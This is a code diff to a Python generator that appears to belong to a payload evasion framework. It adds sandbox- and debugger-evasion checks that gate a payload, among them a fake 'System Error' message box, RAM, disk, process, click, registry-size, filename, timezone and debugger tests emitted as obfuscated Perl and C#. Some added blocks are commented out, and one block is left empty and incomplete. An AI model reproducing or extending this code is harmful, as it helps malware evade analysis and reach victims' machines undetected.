@@ -312,6 +312,44 @@ def senecas_games(evasion_payload):
 
             # Add a tab for this check
             num_tabs_required += 1
+        
+        #if evasion_payload.required_options["DISKSIZE"][0].lower() != "x":
+
+        #    check_code += "require 'win32api'\n"
+        #    check_code += 'minDiskSizeGB = 50\n'
+        #    check_code += "GetDiskFreeSpaceEx = Win32API.new(\"kernel32\", \"GetDiskFreeSpaceEx\", ['P','P','P','P'], 'I')\n"
+        #    check_code += 'diskSizeBytes = [0].pack("Q"); freeBytesAvail = [0].pack("Q"); totalFreeBytes = [0].pack("Q")\n'
+        #    check_code += 'GetDiskFreeSpaceEx.call("C:", freeBytesAvail, diskSizeBytes, totalFreeBytes)\n'
+        #    check_code += 'diskSizeGB = diskSizeBytes.unpack("Q").first / 1073741824.0\n'
+        #    check_code += 'if diskSizeGB > minDiskSizeGB'
+
+            # Add a tab for this check
+        #    num_tabs_required += 1
+        
+        #if evasion_payload.required_options["NUMPROCS"][0].lower() != "x":
+        #    check_code += "require 'win32ole'\n"
+        #    check_code += 'if (WIN32OLE.connect("winmgmts://").ExecQuery("SELECT NumberOfCores FROM Win32_Processor").to_enum.first.NumberOfCores >= ' + evasion_payload.required_options["NUMPROCS"][0] + ')\n'
+
+            # Add a tab for this check
+        #    num_tabs_required += 1
+        
+        #if evasion_payload.required_options["MINRAM"][0].lower() != 'x':
+        
+        #if evasion_payload.required_options["USERPROMPT"][0].lower() != "x":
+
+        ##    title_bar = evasion_helpers.randomString()
+         #   body_text = evasion_helpers.randomString()
+         #   winapi_call = evasion_helpers.randomString()
+
+        #    check_code += 'require "Win32API"\n'
+        #    check_code += title_bar + ' = "System Error Encountered"\n'
+        #    check_code += body_text + ' = "Error encountered at address 0x41d3837f. Press OK to continue"\n'
+        #    check_code += winapi_call + " = Win32API.new('user32', 'MessageBox',['L', 'P', 'P', 'L'],'I')\n"
+        #    check_code += winapi_call + '.call(0,dialogBoxMessage,dialogBoxTitle,0)\n'
+        #    check_code += 'if true\n'
+
+            # Add a tab for this check
+        #    num_tabs_required += 1
 
         if evasion_payload.required_options["SLEEP"][0].lower() != "x":
 
@@ -339,10 +377,133 @@ def senecas_games(evasion_payload):
 
             # Add a tab for this check
             num_tabs_required += 1
+        
+        if evasion_payload.required_options["USERPROMPT"][0].lower() != 'x':
+
+            flags = evasion_helpers.randomString()
+            title_bar_prompt = evasion_helpers.randomString()
+            message_prompt = evasion_helpers.randomString()
+            msg_box = evasion_helpers.randomString()
+
+            check_code += '\t' * num_tabs_required + 'use Win32;\n'
+            check_code += '\t' * num_tabs_required + '$' + flags + ' = 0x0;\n'
+            check_code += '\t' * num_tabs_required + '$' + msg_box + ' = new Win32::API ( "user32", "MessageBox", [N, P, P, I], N );\n'
+            check_code += '\t' * num_tabs_required + '$' + msg_box + '->Call ( 0, "System error at 0x48d72ac3. Press OK to continue.", "System Error Encountered", $' + flags + ');'
+            check_code += '\t' * num_tabs_required + 'if (1) {\n'
+
+            # Add a tab for this check
+            num_tabs_required += 1
+
+        if evasion_payload.required_options["RAMSIZE"][0].lower() != 'x':
+
+            wmi_cim = evasion_helpers.randomString()
+            total_ram = evasion_helpers.randomString()
+            subMem = evasion_helpers.randomString()
+
+            check_code += '\t' * num_tabs_required + 'use Win32::OLE qw(EVENTS HRESULT in);\n'
+            check_code += '\t' * num_tabs_required + 'my $' + wmi_cim + ' = Win32::OLE->GetObject("WINMGMTS://./root/CIMv2");\n'
+            check_code += '\t' * num_tabs_required + 'my $' + total_ram + ' = 0;\n'
+            check_code += '\t' * num_tabs_required + 'foreach my $' + subMem + ' (in($' + wmi_cim + '->InstancesOf("Win32_PhysicalMemory"))) {\n'
+            check_code += '\t' * num_tabs_required + '\t$' + total_ram + ' += $' + subMem + '->{Capacity};\n'
+            check_code += '\t' * num_tabs_required + '}\n'
+            check_code += '\t' * num_tabs_required + 'if ($' + total_ram + '/1073741824 > ' + evasion_payload.required_options["RAMSIZE"][0] + ') {\n'
+
+            # Add a tab for this check
+            num_tabs_required += 1
+
+        if evasion_payload.required_options["FILENAME"][0].lower() != 'x':
+
+            expected_name = evasion_helpers.randomString()
+            actual_name = evasion_helpers.randomString()
+
+            check_code += '\t' * num_tabs_required + 'use File::Basename;\n'
+            check_code += '\t' * num_tabs_required + 'my $' + expected_name + ' = "' + evasion_payload.required_options["FILENAME"][0].lower() + '";\n'
+            check_code += '\t' * num_tabs_required + 'my $' + actual_name + ' = basename($0);\n'
+            check_code += '\t' * num_tabs_required + 'if (index($' + actual_name + ', $' + expected_name + ') != -1) {\n'
+
+            # Add a tab for this check
+            num_tabs_required += 1
+        
+        if evasion_payload.required_options["NUMPROCS"][0].lower() != 'x':
+
+            min_procs = evasion_helpers.randomString()
+            wmi_var = evasion_helpers.randomString()
+            total_procs = evasion_helpers.randomString()
+
+            check_code += '\t' * num_tabs_required + 'use Win32::OLE;\n'
+            check_code += '\t' * num_tabs_required + 'my $' + min_procs + ' = ' + evasion_payload.required_options["NUMPROCS"][0] + ';\n'
+            check_code += '\t' * num_tabs_required + 'my $' + wmi_var + ' = Win32::OLE->GetObject("winmgmts:\\\\\\\\localhost\\\\root\\\\CIMV2") or die;\n'
+            check_code += '\t' * num_tabs_required + 'my $' + total_procs + ' = $' + wmi_var + '->ExecQuery("SELECT * FROM Win32_Process")->{Count} or die;\n'
+            check_code += '\t' * num_tabs_required + 'if ($' + total_procs + ' > $' + min_procs + ') {\n'
+
+            # Add a tab for this check
+            num_tabs_required += 1
+        
+        if evasion_payload.required_options["DISKSIZE"][0].lower() != 'x':
+
+            min_disksize = evasion_helpers.randomString()
+            file_object = evasion_helpers.randomString()
+            real_disksize = evasion_helpers.randomString()
+
+            check_code += '\t' * num_tabs_required + 'use Win32::OLE;\n'
+            check_code += '\t' * num_tabs_required + 'my $' + min_disksize + ' = ' + evasion_payload.required_options['DISKSIZE'][0] + ';\n'
+            check_code += '\t' * num_tabs_required + 'my $' + file_object + ' = Win32::OLE->CreateObject("Scripting.FileSystemObject");\n'
+            check_code += '\t' * num_tabs_required + 'my $' + real_disksize + ' = $' + file_object + '->GetDrive("C:")->{TotalSize}/1073741824.0;\n'
+            check_code += '\t' * num_tabs_required + 'if ($' + min_disksize + ' < $' + real_disksize + ') {\n'
+
+            # Add a tab for this check
+            num_tabs_required += 1
+        
+        if evasion_payload.required_options["NUMCLICKS"][0].lower() != 'x':
+
+            perl_min_clicks = evasion_helpers.randomString()
+            perl_key_state = evasion_helpers.randomString()
+            click_count = evasion_helpers.randomString()
+            perl_leftclick = evasion_helpers.randomString()
+            perl_rightclick = evasion_helpers.randomString()
+
+            check_code += '\t' * num_tabs_required + 'my $' + perl_min_clicks + ' = ' + evasion_payload.required_options["NUMCLICKS"][0] + ';\n'
+            check_code += '\t' * num_tabs_required + 'my $' + perl_key_state + ' = new Win32::API("user32", "GetAsyncKeyState", +"I", "N");\n'
+            check_code += '\t' * num_tabs_required + 'my $' + click_count + ' = 0;\n'
+            check_code += '\t' * num_tabs_required + 'while ($' + click_count + ' < $' + perl_min_clicks + ') {\n'
+            check_code += '\t' * num_tabs_required + '\tmy $' + perl_leftclick + ' = $' + perl_key_state + '->Call(1);\n'
+            check_code += '\t' * num_tabs_required + '\tmy $' + perl_rightclick + ' = $' + perl_key_state + '->Call(2);\n'
+            check_code += '\t' * num_tabs_required + '\tif ($' + perl_leftclick + ') {\n'
+            check_code += '\t' * num_tabs_required + '\t\t++$' + click_count + ';\n'
+            check_code += '\t' * num_tabs_required + '\t}\n'
+            check_code += '\t' * num_tabs_required + '\tif ($' + perl_rightclick + ') {\n'
+            check_code += '\t' * num_tabs_required + '\t\t++$' + click_count + ';\n'
+            check_code += '\t' * num_tabs_required + '\t}\n'
+            check_code += '\t' * num_tabs_required + '\tsleep(2);\n'
+            check_code += '\t' * num_tabs_required + '}\n'
+            check_code += '\t' * num_tabs_required + 'if (1) {\n'
+
+            # Add a tab for this check
+            num_tabs_required += 1
+        
+        if evasion_payload.required_options["REGSIZE"][0].lower() != 'x':
+
+            reg_mb_size = evasion_helpers.randomString()
+            perl_wmi = evasion_helpers.randomString()
+            reg_dump = evasion_helpers.randomString()
+            reg_size = evasion_helpers.randomString()
+            perl_reg_obj = evasion_helpers.randomString()
+
+            check_code += '\t' * num_tabs_required + 'use Win32::OLE;\n'
+            check_code += '\t' * num_tabs_required + 'my $' + reg_mb_size + ' = ' + evasion_payload.required_options["REGSIZE"][0] + ';\n'
+            check_code += '\t' * num_tabs_required + 'my $' + perl_wmi + ' = Win32::OLE->GetObject("winmgmts:\\\\\\\\localhost\\\\root\\\\CIMV2") or die;\n'
+            check_code += '\t' * num_tabs_required + 'my $' + reg_dump + ' = $' + perl_wmi + '->ExecQuery("SELECT CurrentSize from Win32_Registry") or die;\n'
+            check_code += '\t' * num_tabs_required + 'my $' + reg_size + ';\n'
+            check_code += '\t' * num_tabs_required + 'foreach my $' + perl_reg_obj + ' (in $' + reg_dump + ') { $' + reg_size + ' = $' + perl_reg_obj + '->CurrentSize; }\n'
+            check_code += '\t' * num_tabs_required + 'if ($' + reg_size + ' > $' + reg_mb_size + ') {\n'
+
+            # Add a tab for this check
+            num_tabs_required += 1
 
         if evasion_payload.required_options["USERNAME"][0].lower() != "x":
 
             rand_name = evasion_helpers.randomString()
+
             check_code += '\t' * num_tabs_required + 'my $' + rand_name + ' = Win32::LoginName;\n'
             check_code += '\t' * num_tabs_required + 'if (index(lc($' + rand_name + '), lc(\"' + evasion_payload.required_options["USERNAME"][0] + '\")) != -1){\n'
 
@@ -533,6 +694,23 @@ def senecas_games(evasion_payload):
 
             # Add a tab for this check
             num_tabs_required += 1
+        
+        if evasion_payload.required_options["TIMEZONE"][0].lower() != 'x':
+
+            check_code += '\t' * num_tabs_required + 'if (TimeZone.CurrentTimeZone.StandardName != "Coordinated Universal Time") {\n'
+
+            # Add a tab for this check
+            num_tabs_required += 1
+        
+        if evasion_payload.required_options["DEBUGGER"][0].lower() != 'x':
+
+            check_code += '\t' * num_tabs_required + 'if (!System.Diagnostics.Debugger.IsAttached) {\n'
+
+            # Add a tab for this check
+            num_tabs_required += 1
+        
+        if evasion_payload.required_options["BADMACS"][0].lower() != 'x':
+
 
         if evasion_payload.required_options["DOMAIN"][0].lower() != "x":
 
